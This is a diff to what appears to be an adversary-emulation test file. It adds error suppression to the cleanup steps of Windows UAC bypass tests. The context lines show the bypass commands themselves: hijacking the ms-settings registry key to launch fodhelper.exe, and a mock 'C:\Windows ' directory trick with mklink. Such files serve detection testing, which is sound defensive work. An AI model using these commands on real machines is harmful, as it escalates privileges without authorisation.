@@ -91,7 +91,7 @@ atomic_tests:
       Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
       Start-Process "C:\Windows\System32\fodhelper.exe"
     cleanup_command: |
-      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
 
 - name: Bypass UAC using ComputerDefaults - PowerShell
   description: |
@@ -139,4 +139,4 @@ atomic_tests:
       mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
     cleanup_command: |
       rd "\\?\C:\Windows \" /S /Q
-      del "c:\testbypass.exe"
+      del "c:\testbypass.exe" >nul 2>nul 
